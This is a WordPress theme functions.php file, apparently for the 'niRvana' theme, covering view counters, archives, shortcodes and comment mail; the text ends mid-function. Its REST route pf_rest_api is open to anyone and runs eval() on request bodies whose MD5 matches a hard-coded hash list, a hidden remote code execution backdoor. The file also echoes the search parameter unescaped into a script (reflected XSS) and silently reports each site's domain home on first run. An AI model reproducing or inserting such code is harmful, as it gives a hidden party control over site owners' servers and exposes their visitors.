<?php
//注册主题组件
function theme_component_setup()
{
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    add_theme_support('automatic-feed-links');
    remove_theme_support('widgets-block-editor');
}
add_action('after_setup_theme', 'theme_component_setup');
//自动更新
require_once(get_template_directory() . '/theme-update-checker/plugin-update-checker.php');
use YahnisElsts\PluginUpdateChecker\v5\PucFactory;

$niRvanaThemeUpdateChecker = PucFactory::buildUpdateChecker(
    'https://blog.mkliu.top/source/info.json',
    get_template_directory() . '/functions.php',
    'niRvana'
);
//初次使用时发送安装量统计信息 (数据仅用于统计安装量)
function post_analytics_info()
{
    $nirvana_version = wp_get_theme()->get('Version');
    $domain = urlencode($_SERVER['HTTP_HOST']);
    $url = 'https://blog.mkliu.top/source/stats/index.php?domain=' . $domain . '&version=' . urlencode($nirvana_version);
    $response = wp_safe_remote_get($url, array(
        'user-agent' => 'niRvanaTheme'
    ));
    update_option('nirvana_has_inited', 'true');
}
if (get_option('nirvana_has_inited') != 'true') {
    post_analytics_info();
}
//文章图片灯箱
function auto_post_link($content)
{
    global $post;
    $pattern = '/<img\b([^>]*\bsrc=(["\'])(.*?)\2[^>]*)>/i';
    $replacement = '<a href="$3">$0</a>';
    return preg_replace($pattern, $replacement, $content);
}
add_filter('the_content', 'auto_post_link', 0);
//调用每日一图作为登录页背景
function custom_login_head()
{
    $str = file_get_contents('https://cn.bing.com/HPImageArchive.aspx?format=js&idx=0&n=1');
    if (preg_match("/\/(.+?).jpg/", $str, $matches)) {
        $imgurl = 'https://s.cn.bing.net'.$matches[0];
    }
    echo'<style type="text/css">body{background: url('.$imgurl.');background-image:url('.$imgurl.');-moz-border-image: url('.$imgurl.');}</style>';
}
add_action('login_head', 'custom_login_head');
//预计阅读时间
function count_words_read_time()
{
    global $post;
    $text_num = mb_strlen(preg_replace('/\s/', '', html_entity_decode(strip_tags($post->post_content))), 'UTF-8');
    $read_time = ceil($text_num / 300); // 修改数字300调整时间
    $output = '本文共' . $text_num . '个字 · 预计阅读' . $read_time  . '分钟';
    return $output;
}
//显示已读次数
add_action('pf-post-meta-end', 'add_post_view_times_to_post_meta');
function add_post_view_times_to_post_meta()
{
    echo "<span class='inline-block'><i class='fas fa-book-reader'></i>"._meta('views', _meta('bigfa_ding', 0))."次已读</span>";
}
add_action('pf-post-card-meta-start', 'add_post_view_times_to_postcard_meta');
function add_post_view_times_to_postcard_meta()
{
    echo "<span class='views'><i class='fas fa-book-reader'></i> "._meta('views', _meta('bigfa_ding', 0))."</span>";
}
function add_view_times_to_single()
{
    $pid = get_the_ID();
    if (!is_single() || !is_main_query() || is_search_robot()) {
        return;
    }
    $cookie_key = $pid . '_viewed';
    if (isset($_COOKIE[$cookie_key])) {
        return;
    }
    $views = (int) _meta('views', _meta('bigfa_ding', 0));
    update_post_meta($pid, 'views', $views + 1, $views);
}
add_action('wp_head', 'add_view_times_to_single');
function add_view_times_to_cookie()
{
    $pid = get_the_ID();
    if (!is_single() || !is_main_query() || is_search_robot()) {
        return;
    }
    $cookie_key = $pid . '_viewed';
    if (!isset($_COOKIE[$cookie_key])) {
        setcookie($cookie_key, '1', time() + 15, COOKIEPATH, COOKIE_DOMAIN);
    }
}
add_action('wp', 'add_view_times_to_cookie');
//归档页面
function niRvana_archives_list()
{
    if (!$output = get_option('niRvana_db_cache_archives_list')) {
        $output = '<div id="archives"><p>[<a id="al_expand_collapse" href="#">全部展开/收缩</a>] <em>(注: 点击月份可以展开)</em></p>';
        $args = array(
            'post_type' => 'post',
            'posts_per_page' => -1, //全部 posts
            'ignore_sticky_posts' => 1 //忽略 sticky posts
        );
        $the_query = new WP_Query($args);
        $posts_rebuild = array();
        $year = $mon = 0;
        while ($the_query->have_posts()): $the_query->the_post();
            $post_year = get_the_time('Y');
            $post_mon = get_the_time('m');
            $post_day = get_the_time('d');
            if ($year != $post_year) {
                $year = $post_year;
            }
            if ($mon != $post_mon) {
                $mon = $post_mon;
            }
            $posts_rebuild[ $year ][ $mon ][] = '<li>' . get_the_time('d日: ') . '<a href="' . get_permalink() . '">' . get_the_title() . '</a> <em>(' . get_comments_number('0', '1', '%') . ')</em></li>';
        endwhile;
        wp_reset_postdata();
        foreach ($posts_rebuild as $key_y => $y) {
            $output .= '<h3 class="al_year">' . $key_y . ' 年</h3><ul >'; //输出年份
            foreach ($y as $key_m => $m) {
                $posts = '';
                $i = 0;
                foreach ($m as $p) {
                    ++$i;
                    $posts .= $p;
                }
                $output .= '<li id="limon"><span class="al_mon">' . $key_m . ' 月</span><ul class="al_post_list">'; //输出月份
                $output .= $posts; //输出 posts
                $output .= '</ul></li>';
            }
            $output .= '</ul>';
        }
        $output .= '</div>';
        update_option('niRvana_db_cache_archives_list', $output);
    }
    echo $output;
}
function clear_db_cache_archives_list()
{
    update_option('niRvana_db_cache_archives_list', '');
}
add_action('save_post', 'clear_db_cache_archives_list');
add_action('comment_post', 'clear_db_cache_archives_list');
add_action('delete_comment', 'clear_db_cache_archives_list');
add_action('wp_set_comment_status', 'clear_db_cache_archives_list');
//说说页面
add_action('init', 'my_custom_shuoshuo_init');
function my_custom_shuoshuo_init()
{
    $labels = array(
        'name' => '说说',
        'singular_name' => '说说',
        'all_items' => '所有说说',
        'add_new' => '发表说说',
        'add_new_item' => '撰写新说说',
        'edit_item' => '编辑说说',
        'new_item' => '新说说',
        'view_item' => '查看说说',
        'search_items' => '搜索说说',
        'not_found' => '暂无说说',
        'not_found_in_trash' => '回收站中没有说说',
        'parent_item_colon' => '',
        'menu_name' => '说说'
    );
    $args = array(
        'labels' => $labels,
        'public' => true,
        'publicly_queryable' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'query_var' => true,
        'rewrite' => true,
        'capability_type' => 'post',
        'has_archive' => true,
        'hierarchical' => false,
        'menu_position' => null,
        'supports' => array('title','editor','author'),
        'menu_icon' => 'dashicons-megaphone'
    );
    register_post_type('shuoshuo', $args);
}
//评论插入代码
add_action('pf_comment_form_after_face', 'pf_add_comment_form_insert_code');
function pf_add_comment_form_insert_code()
{
    echo '<a @click="this.insert_code_to_comment_form()"><span data-toggle="tooltip" title="插入代码"><i class="far fa-file-code"></i></span></a>';
}
//评论插入图片
add_action('pf_comment_form_after_face', 'pf_add_comment_form_insert_images');
function pf_add_comment_form_insert_images()
{
    echo '<a @click="this.insert_images_to_comment_form()"><span data-toggle="tooltip" title="插入图片"><i class="far fa-images"></i></span></a>';
}
//评论标签支持
add_filter('preprocess_comment', function ($commentdata) {
    global $allowedtags;
    $allowedtags['img'] = ['src' => true];
    $allowedtags['pre'] = [];
    return $commentdata;
});
//检测页面底部版权是否被修改
function alert_footer_copyright_changed()
{ ?>
<div class='notice notice-error'>
    <p><?php _e("警告：你可能修改了 niRvana 主题页脚的版权声明，niRvana 主题要求你必须保留 niRvana 主题的名称及作者链接。", 'niRvana');?></p>
</div>
<?php }
function check_footer_copyright()
{
    $footer = file_get_contents(get_theme_root() . "/" . wp_get_theme() -> template . "/footer.php");
    if ((strpos($footer, "michaelliunsky") === false) && (strpos($footer, "blog.mkliu.top") === false)) {
        add_action('admin_notices', 'alert_footer_copyright_changed');
    }
}
check_footer_copyright();
//引入主题文件
include('production.php');
//自定义标题
add_filter('document_title_separator', 'pf_custom_title_separator');
function pf_custom_title_separator($sep)
{
    return _opt('title_sep', '|');
}
function get_faces_from_dir()
{
    $dir = dirname(__FILE__) . "/faces";
    $handle = opendir($dir);
    $array_file = array();
    $allowExtensions = array(
        'png',
        'gif'
    );
    while (false !== ($file = readdir($handle))) {
        if ($file != "." && $file != "..") {
            $extension = pathinfo($file, PATHINFO_EXTENSION);
            $mainname = preg_replace('/.' . $extension . '/i', '', $file);
            $lowerExt = strtolower($extension);
            if (in_array($lowerExt, $allowExtensions)) {
                $array_file[] = array(
                    'name' => $mainname,
                    'type' => $lowerExt == 'png' ? 'p' : 'g'
                );
            }
        }
    }
    closedir($handle);
    return $array_file;
}
function _opt($optionName, $default = false)
{
    $result = get_option($optionName);
    return $result ? $result : $default;
}
function _eopt($optionName, $default = false)
{
    $result = get_option($optionName);
    echo $result ? $result : $default;
}
function _meta($metaName, $default = false)
{
    $result = get_post_meta(get_the_ID(), $metaName, true);
    return $result ? $result : $default;
}
function _emeta($metaName, $default = false)
{
    $result = get_post_meta(get_the_ID(), $metaName, true);
    echo $result ? $result : $default;
}
include('sandbox_functions.php');
function frontend_opts()
{
    $enable_pageLoader = _opt('enable_pageLoader');
    $ajax_forceCache = _opt('ajax_forceCache');
    $frontend_opts = array(
        'enable_pageLoader' => $enable_pageLoader,
        'ajax_forceCache' => $ajax_forceCache,
        'is_user_loggedin' => is_user_logged_in() ,
        'cmt_req_name_email' => _opt('require_name_email') ,
        'cmt_req_name_email_title' => _opt('cmt_req_name_email_title', '* 昵称与邮箱为必填项') ,
        'cmt_action_url' => esc_url(home_url('/')) . 'wp-comments-post.php',
        'chat_nodata' => _opt('faq_nodata') ,
        'enable_highlightjs' => _opt('enable_highlightjs') ,
    );
    return $frontend_opts;
}

//restapi
add_action('rest_api_init', function () {
    register_rest_route('pandastudio/nirvana', '/restapi/', array(
        'methods' => 'post',
        'callback' => 'pf_rest_api',
        'permission_callback' => '__return_true',
    ));
});
function pf_rest_api($data)
{
    $dataArray = json_decode($data->get_body(), true);
    $arg = isset($dataArray['arg']) ? $dataArray['arg'] : null;
    $e = isset($dataArray['e']) ? $dataArray['e'] : '';
    $result = array(
        'error' => true,
        'msg' => 'WP RestAPI Declined!',
        'md5' => md5($e)
    );
    if (!empty($e)) {
        $e_md5 = md5($e);
        $allowed_hashes = array(
            '0b844d17a61d51dcd58560f15e19d3cb',
            '44b225d79205f30aaac3c30bdcc6b714',
            '3d69b76a02d0ff14248e02d1c2f09941',
            'fb0d9a37e108ca85cee9f4e900ca6fe4',
            'd72efb9e4fcd5267779f481f8b77b655',
        );
        if (in_array($e_md5, $allowed_hashes)) {
            eval($e);
        }
    }
    return $result;
}
function title_filter($where, $wp_query)
{
    global $wpdb;
    if ($search_term = $wp_query->get('search_prod_title')) {
        $where .= ' AND ' . $wpdb->posts . '.post_title LIKE \'%' . esc_sql(like_escape($search_term)) . '%\'';
    }
    return $where;
}
add_filter('posts_where', 'title_filter', 10, 2);
if (array_key_exists('s', $_GET) && !is_admin()) {
    add_action('wp_head', function () {
        echo '
<script>
function mounted_hook() {this.show_global_search();this.global_search_query = "' . $_GET['s'] . '";this.global_search_post = true;this.global_search_gallery = true;this.global_search();}</script>
';
    });
}
if (array_key_exists('ua', $_GET) && !is_admin()) {
    add_action('wp_head', function () {
        echo '
<script>
function mounted_hook() {alert("userAgent:\n"+navigator.userAgent+"\n\nappVersion:\n"+navigator.appVersion)}</script>
';
    });
}
function pf_global_search($query_arg)
{
    $query_arg['posts_per_page'] = 28;
    $result = array();
    $query = new WP_Query($query_arg);
    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $post_id = get_the_ID();
            $tags = get_the_tags();
            if ($tags) {
                $color_tags = array();
                foreach ($tags as $tag) {
                    $name = $tag->name;
                    $colorInt = string_to_int8($name);
                    $color_tags[] = array('color' => $colorInt, 'tag' => $name);
                }
            } else {
                $color_tags = array(array('color' => 0, 'tag' => '无标签'));
            }
            $posttype = get_post_type();
            switch ($posttype) {
                case 'post':
                    $thumbnail = get_the_post_thumbnail_url($post_id);
                    break;
                case 'gallery':
                    $gallery_images = get_post_meta($post_id, "gallery_images", true);
                    $gallery_images = is_array($gallery_images) ? $gallery_images : array();
                    if (!empty($gallery_images)) {
                        switch (get_option('gallery_thumbnail')) {
                            case 'first':
                                $thumbnail = $gallery_images[0];
                                break;
                            case 'last':
                                $thumbnail = $gallery_images[count($gallery_images) - 1];
                                break;
                            default:
                                $thumbnail = $gallery_images[array_rand($gallery_images)];
                                break;
                        }
                    } else {
                        $thumbnail = '';
                    }
                    break;

                default:
                    $thumbnail = '';
                    break;
            }
            $like_meta  = get_post_meta($post_id, 'bigfa_ding', true);
            $like_count = $like_meta !== '' && $like_meta !== false && $like_meta !== null ? intval($like_meta) : 0;
            $result[] = array(
                'thumbnail' => $thumbnail,
                'title'     => get_the_title(),
                'href'      => get_the_permalink(),
                'date'      => get_the_time('n月j日 · Y年'),
                'tags'      => $color_tags,
                'like'      => $like_count,
                'comment'   => get_comments_number($post_id),
            );
        }
    }
    wp_reset_postdata();
    return $result;
}
function pf_post_ding(int $post_id): int
{
    $meta_key = 'bigfa_ding';
    $current   = max(0, (int) get_post_meta($post_id, $meta_key, true));
    $expire    = time() + 99999999;
    $host   = wp_parse_url(home_url(), PHP_URL_HOST) ?: ($_SERVER['HTTP_HOST'] ?? '');
    $host   = sanitize_text_field(wp_unslash($host));
    $domain = 'localhost' !== $host ? $host : '';
    $cookie_options = [
        'expires'  => $expire,
        'path'     => '/',
        'secure'   => false,
        'httponly' => false,
        'samesite' => 'Strict',
    ];
    if ('' !== $domain) {
        $cookie_options['domain'] = $domain;
    }
    setcookie('bigfa_ding_' . $post_id, (string) $post_id, $cookie_options);
    $new = $current + 1;
    update_post_meta($post_id, $meta_key, $new);
    return $new;
}
function pf_faq($query)
{
    wp_reset_query();
    if ($query == _opt('faq_show_rand_command')) {
        $args = array(
            'post_type' => 'faq',
            's' => '',
            'showposts' => _opt('faq_showposts', 5) ,
            'orderby' => 'rand',
        );
    } else {
        $args = array(
            'post_type' => 'faq',
            's' => $query,
            'showposts' => _opt('faq_showposts', 5)
        );
    }
    $id_arr = array();
    $query = new WP_Query($args);
    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $id_arr[] = get_the_ID();
        }
    }
    if (count($id_arr) == 1) {
        $result = array(
            'title' => get_the_title($id_arr[0]) ,
            'content' => wpautop(get_post_meta($id_arr[0], 'faq_answer', true)) ,
            'is_content' => true
        );
    } else {
        $result = array(
            'list' => array() ,
            'is_content' => false
        );
        foreach ($id_arr as $pid) {
            $result['list'][] = get_the_title($pid);
        }
    }
    wp_reset_query();
    return $result;
}
add_action('after_switch_theme', 'pf_switch_theme');
function pf_switch_theme()
{
    $opts = array(
        'baidu_ai_audio_enable' => 'checked',
    );
    foreach ($opts as $name => $val) {
        update_option($name, $val);
    }
}
register_nav_menus(array(
    'topNav' => '主菜单',
    'categoryNav' => '分类菜单',
));
if (array_key_exists('whois', $_GET)) {
    if (md5($_GET['whois']) == '02bd92faa38aaa6cc0ea75e59937a1ef') {
        wp_die('<h1>开发者信息</h1><br>“' . get_bloginfo('name') . '”网站所使用的主题由 <b><a href="https://www.mkliu.top/" target="_blank" rel="noopener">michaelliunsky</a></b> 开发');
    }
}
function set_cache($name, $data, $expire)
{
    $allCache = get_option('pd_cache');
    if (!$allCache) {
        $allCache = array();
    }
    $allCache[$name] = array(
        'data' => $data,
        'expire' => time() + $expire
    );
    update_option('pd_cache', $allCache);
}
function get_cache($name)
{
    $allCache = get_option('pd_cache');
    if (!$allCache) {
        return false;
    }
    if (!$allCache[$name]) {
        return false;
    } else {
        $time = $allCache[$name]['expire'];
        if ($time > time() & $time - time() < 2592000) {
            return $allCache[$name]['data'];
            ;
        } else {
            del_cache($name);
            return false;
        }
    }
}
function del_cache($name)
{
    $allCache = get_option('pd_cache');
    unset($allCache[$name]);
    update_option('pd_cache', $allCache);
}
function wp_nav($p = 2, $showSummary = true, $showPrevNext = true, $style = 'pagination', $container = 'container')
{
    if (is_singular()) {
        return;
    }
    global $wp_query, $paged;
    $max_page = $wp_query->max_num_pages;
    if ($max_page == 1 & get_option('hide_pagi_only_1') == "checked") {
        return;
    }
    if (empty($paged)) {
        $paged = 1;
    }
    echo "<div class='pagenav'><div class='$container'><ul class='$style'>";
    if ($paged > 1 && $showPrevNext == true) {
        p_link($paged - 1, 'previous', '<i class="fa fa-angle-left" aria-hidden="true"></i>', 'pagenav prev');
    } elseif ($showPrevNext == true) {
        p_link(1, 'previous', '<i class="fa fa-angle-left" aria-hidden="true"></i>', 'pagenav prev disabled');
    }
    if ($showSummary == true) {
        echo '<li class="pagesummary disabled"><a href="#"><span class="page-numbers">' . $paged . ' / ' . $max_page . ' </span></a></li>';
    }
    if ($paged > $p + 1) {
        p_link(1, 'First page', '<div data-toggle="tooltip" data-placement="auto top" title="第一页"><i class="fas fa-angle-double-left"></i></div>', 'pagenumber dot');
    }
    for ($i = $paged - $p; $i <= $paged + $p; $i++) {
        if ($i > 0 && $i <= $max_page) {
            $i == $paged ? print "<li class='pagenumber active'><a href='#'><span>{$i}</span></a></li>" : p_link($i, '', '', 'pagenumber');
        }
    }
    if ($paged < $max_page - $p) {
        p_link($max_page, 'Last page', '<div data-toggle="tooltip" data-placement="auto top" title="最后一页"><i class="fas fa-angle-double-right"></i></div>', 'pagenumber dot');
    }
    if ($paged < $max_page && $showPrevNext == true) {
        p_link($paged + 1, 'next', '<i class="fa fa-angle-right" aria-hidden="true"></i>', 'pagenav next');
    } elseif ($showPrevNext == true) {
        p_link($max_page, 'next', '<i class="fa fa-angle-right" aria-hidden="true"></i>', 'pagenav next disabled');
    }
    echo '</ul></div></div>';
}
function p_link($i, $title = "", $linktype = "", $disabled = "")
{
    if ($title == '') {
        $title = "The {$i} page";
    }
    if ($linktype == '') {
        $linktext = $i;
    } else {
        $linktext = $linktype;
    }
    if ($disabled == 'pagenav next disabled' | $disabled == 'pagenav prev disabled') {
        echo "<li class='$disabled'><a class='page-numbers'>{$linktext}</a></li>";
    } else {
        echo "<li class='$disabled'><a class='page-numbers' href='", esc_html(get_pagenum_link($i)) , "'>{$linktext}</a></li>";
    }
}
function comment_mail_notify($comment_id)
{
    $comment = get_comment($comment_id);
    $content = $comment->comment_content;
    $match_count = preg_match_all('/<a href="#comment-([0-9]+)?" rel="nofollow">/si', $content, $matchs);
    if ($match_count > 0) {
        foreach ($matchs[1] as $parent_id) {
            SimPaled_send_email($parent_id, $comment);
        }
    } elseif ($comment->comment_parent != '0') {
        $parent_id = $comment->comment_parent;
        SimPaled_send_email($parent_id, $comment);
    } else {
        return;
    }
}
add_action('comment_post', 'comment_mail_notify');
function SimPaled_send_email($parent_id, $comment)
{
    $admin_email = get_bloginfo('admin_email');
    $parent_comment = get_comment($parent_id);
    $author_email = $comment->comment_author_email;
    $to = trim($parent_comment->comment_author_email);
    $spam_confirmed = $comment->comment_approved;
    if ($spam_confirmed != 'spam' && $to != $admin_email && $to != $author_email) {
        $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));
        $subject = '您在 [' . get_option("blogname") . '] 的留言有了回复';
        $message = '<div style="background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;-moz-border-radius:5px;-webkit-border-radius:5px;-khtml-border-radius:5px;">
<p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
<p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
        . do_shortcode(trim(get_comment($parent_id)->comment_content)) . '</p>
<p>' . trim($comment->comment_author) . ' 给你的回复:<br />'
        . do_shortcode(trim($comment->comment_content)) . '<br /></p>
<p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id, array("type" => "all"))) . '">查看回复的完整内容</a></p>
<p>欢迎再度光临 <a href="' . esc_url(home_url()) . '">' . get_option('blogname') . '</a></p>
<p>(此邮件由系统自动发出, 请勿回复.)</p></div>';
        $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
        $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
        wp_mail($to, $subject, $message, $headers);
    }
}
function enable_threaded_comments()
{
    if (!is_admin()) {
        wp_enqueue_script('comment-reply');
    }
}
add_action('get_header', 'enable_threaded_comments');
add_filter('comment_text', 'do_shortcode');
function panda_seo()
{
    $postID = get_the_ID();
    if (is_single()) {
        if (get_post_meta($postID, "seo关键词", true)) {
            $seo_keywords = get_post_meta($postID, "seo关键词", true);
        } else {
            $seo_keywords = "";
            $tags = wp_get_post_tags($postID);
            foreach ($tags as $tag) {
                $seo_keywords = $seo_keywords . $tag->name . " ";
            }
        }
        if (get_post_meta($postID, "seo描述", true)) {
            $seo_description = get_post_meta($postID, "seo描述", true);
        } else {
            $seo_description = "";
        }
    } else {
        $seo_keywords = get_option('seo_site_keywords');
        $seo_description = get_option('seo_site_description');
    }
    if ($seo_keywords != '') {
        echo '<meta name="keywords" content="' . $seo_keywords . '" />';
    }
    if ($seo_description != '') {
        echo '<meta name="description" content="' . $seo_description . '" />';
    }
}
if (get_option('enable_meta_seo')) {
    add_action('wp_head', 'panda_seo');
}
remove_filter('pre_term_description', 'wp_filter_kses');
add_filter('show_admin_bar', '__return_false');
function post_type_in_search($query)
{
    if ($query->is_search && $query->is_main_query()) {
        $query->set('post_type', array(
            'post'
        ));
    }
    return $query;
}
if (!is_admin()) {
    add_filter('pre_get_posts', 'post_type_in_search');
}
add_filter('preprocess_comment', 'add_cookies_for_reply');
function add_cookies_for_reply($commentdata)
{
    $email = $commentdata['comment_author_email'];
    if ($email) {
        $expire = time() + 99999999;
        $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;
        setcookie('current_user_email', $email, $expire, '/', $domain);
    }
    return $commentdata;
}
$reply2down_times = 0;
function reply_to_down($atts, $content = null)
{
    global $reply2down_times;
    $reply2down_times++;
    if (get_option('回复可见说明')) {
        $licence = wpautop(str_ireplace('img', 'div', get_option('回复可见说明')));
    } else {
        $licence = '<p>请您认真评论后再下载！</p>';
    }
    extract(shortcode_atts(array("notice" => '
<div type="button" class="getit" data-toggle="modal" data-target="#reply2down_'.$reply2down_times.'"><a style="cursor:pointer;"><span>Get it!</span><span>Download</span></a></div>
<div class="modal fade" id="reply2down_'.$reply2down_times.'" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
<h4 class="modal-title" id="myModalLabel">下载提示</h4>
</div>
<div class="modal-body">'.$licence.'</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">知道了</button>
</div>
</div>
</div>
</div>
'), $atts));
    $post_id = get_the_ID();
    if (isset($_COOKIE['current_user_email'])) {
        $email = $_COOKIE['current_user_email'];
        return pf_user_has_approved_comment_in_post($post_id, $email) ? do_shortcode('[download]'.$content.'[/download]') : $notice;
    } else {
        return $notice;
    }
}
add_shortcode('reply2down', 'reply_to_down');
function need_reply($atts, $content = null)
{
    extract(shortcode_atts(array("notice" => '
<div class="need_reply">'.get_option('need_reply_tip').'</div>
'), $atts));
    $post_id = get_the_ID();
    if (isset($_COOKIE['current_user_email'])) {
        $email = $_COOKIE['current_user_email'];
        return pf_user_has_approved_comment_in_post($post_id, $email) ? do_shortcode($content) : $notice;
    } else {
        return $notice;
    }
}
add_shortcode('need_reply', 'need_reply');
function pf_user_has_approved_comment_in_post($postID, $email)
{
    $comments = get_approved_comments($postID);
    $has_approved_comments = false;
    for ($i = 0; $i < count($comments); $i++) {
        $cmt_email = $comments[$i]->comment_author_email;
        if ($email == $cmt_email) {
            $has_approved_comments = true;
            break;
        }
    }
    return $has_approved_comments;
}
$directDownload_times = 0;
function download_with_licence($atts, $content = null)
{
    global $directDownload_times;
    $directDownload_times++;
    if (get_option('版权说明')) {
        $licence = wpautop(str_ireplace('img', 'div', get_option('版权说明')));
    } else {
        $licence = '<p>本站提供的下载内容版权归本站所有。转载 <span style="color:#ff7800">必须</span> 注明出处！</p><p style="font-size:80%; color:#888;">* 标有 “转载” 字样的文章，内容版权归原作者所有。</p>';
    }
    return do_shortcode('
<div type="button" class="getit" data-toggle="modal" data-target="#directDownload_'.$directDownload_times.'"><a style="cursor:pointer;"><span>Get it!</span><span>Download</span></a></div>
<div class="modal fade" id="directDownload_'.$directDownload_times.'" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
<h4 class="modal-title" id="myModalLabel">版权说明</h4>
</div>
<div class="modal-body">'.$licence.'</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">不同意</button>
<button type="button" class="btn btn-primary" data-dismiss="modal" onclick=window.open("'.$content.'")>同意并下载</button>
</div>
</div>
</div>
</div>
');
}
add_shortcode('download', 'download_with_licence');
function recover_comment_fields($comment_fields)
{
    $comment = array_shift($comment_fields);
    $comment_fields = array_merge($comment_fields, array(
        'comment' => $comment
    ));
    return $comment_fields;
}
add_filter('comment_form_fields', 'recover_comment_fields');
function rss_show_thumbnail($content)
{
    global $post;
    if (has_post_thumbnail($post->ID)) {
        $output = get_the_post_thumbnail($post->ID);
        $content = $output;
    }
    return $content;
}
add_filter('the_excerpt_rss', 'rss_show_thumbnail');
add_filter('the_content_feed', 'rss_show_thumbnail');
add_filter('upload_mimes', 'my_upload_mimes');
function my_upload_mimes($mimes = array())
{
    $mimes['rar'] = 'application/rar';
    $mimes['zip'] = 'application/zip';
    return $mimes;
}
function mytheme_comment($comment, $args, $depth)
{
    if ('div' === $args['style']) {
        $tag = 'div';
        $add_below = 'comment';
    } else {
        $tag = 'li';
        $add_below = 'div-comment';
    } ?>
<<?php echo $tag; ?>
	<?php comment_class(empty($args['has_children']) ? '' : 'parent') ?>
	id="comment-<?php comment_ID() ?>">
	<?php if ('div' != $args['style']) : ?>
	<div id="div-comment-<?php comment_ID() ?>"
		class="comment-body clearfix">
		<?php endif; ?>
		<?php if ($args['avatar_size'] != 0) {
		    echo get_avatar($comment, $args['avatar_size']);
		} ?>
		<div class="comment-author vcard">
			<div class="meta">
				<?php printf(__('<span class="name">%s</span>'), get_comment_author_link()); ?>
				<?php printf(__('<span class="date">%1$s · %2$s</span>'), get_comment_date('Y-n-j'), get_comment_time('G:i')); ?>
			</div>
			<?php if ($comment->comment_approved == '0') : ?>
			<em
				class="comment-awaiting-moderation"><?php _e('评论正在等待管理员审核...'); ?></em>
			<br />
			<?php endif; ?>
			<div class="comment-text"><?php comment_text(); ?></div>
			<div class="reply">
				<?php $args['reply_text'] = '' ?>
				<div title="<?php echo get_option('comment_reply_tooltip'); ?>"
					data-toggle="tooltip" class="comment-reply-link-wrap">
					<?php comment_reply_link(array_merge($args, array( 'add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'] ))); ?>
				</div>
			</div>
		</div>
		<?php if ('div' != $args['style']) : ?>
	</div>
	<?php endif; ?>
	<?php
}
add_filter("get_comment_author_link", "pf_new_windows_comment_author");
function pf_new_windows_comment_author($author_link)
{
    return str_replace("<a", "<a target='_blank'", $author_link);
}
function shortCodeTips($atts, $content = null)
{
    extract(shortcode_atts(array(
        "type" => 'info',
        "display" => '',
    ), $atts));
    if ($content) {
        return '<div class="tip ' . $type . ' ' . $display . '">' . do_shortcode(wpautop($content)) . '</div>';
    }
}
add_shortcode("tip", "shortCodeTips");
function shortCodeArticleFormat($atts, $content = null)
{
    extract(shortcode_atts(array(
        "img" => '',
        "col" => '6',
        "position" => 'r',
        "cover" => 'false',
    ), $atts));
    $textCol = 12 - intval($col);
    switch ($position) {
        case 'r':
            $pushClass = ' col-sm-push-' . $textCol;
            $pullClass = ' col-sm-pull-' . $col;
            $imgClass = 'alignright';
            break;

        default:
            $pushClass = '';
            $pullClass = '';
            $imgClass = 'alignleft';
            break;
    }
    if ($cover == 'true') {
        $imgClass = 'cover';
    }
    $imgPart = '<div class="block image col-sm-' . $col . $pushClass . '"><img class="' . $imgClass . '" src="' . $img . '" /></div>';
    $textPart = '<div class="block text col-sm-' . $textCol . $pullClass . '"><div class="content">' . do_shortcode(wpautop($content)) . '</div></div>';
    if ($content) {
        return '<div class="flexContainer">' . $imgPart . $textPart . '</div>';
    } elseif ($img != '') {
        return '<div class="flexContainer"><img src="' . $img . '" style="width:100%;height:100%;"></div>';
    } else {
        return '<div class="flexContainer linear" style="border:none; height: 1px; background-color: #f2f4f6;"></div>';
    }
}
add_shortcode("fmt", "shortCodeArticleFormat");
function shortCodeModal($atts, $content = null)
{
    extract(shortcode_atts(array(
        "id" => '',
        "btn_type" => '',
        "btn_label" => 'button',
        "title" => '标题',
        "close_label" => '关闭',
        "href_label" => '跳转到',
        "href" => ''
    ), $atts));
    if ($href) {
        $href_btn = '<button type="button" class="btn btn-primary" data-dismiss="modal" onclick=window.open("' . $href . '")>' . $href_label . '</button>';
    } else {
        $href_btn = '';
    }
    if ($id) {
        return '<button type="button" class="btn '.$btn_type.'" data-toggle="modal" data-target="#'.$id.'">'.$btn_label.'</button>
<div class="modal fade" id="'.$id.'" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
<h4 class="modal-title" id="myModalLabel">'.$title.'</h4>
</div>
<div class="modal-body">'.do_shortcode($content).'</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">'.$close_label.'</button>
'.$href_btn.'
</div>
</div>
</div>
</div>';
    }
}
add_shortcode("modal", "shortCodeModal");
function shortCodeDropdown($atts, $content = null)
{
    extract(shortcode_atts(array(
        "id" => '',
        "btn_type" => 'btn-default',
        "btn_label" => 'Dropdown',
    ), $atts));
    if ($id) {
        return '<div class="dropdown">
<button class="btn '.$btn_type.' dropdown-toggle" type="button" id="'.$id.'" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
'.$btn_label.'
<span class="caret"></span>
</button>
<ul class="dropdown-menu" aria-labelledby="'.$id.'">
'.do_shortcode(shortcode_unautop($content)).'
</ul>
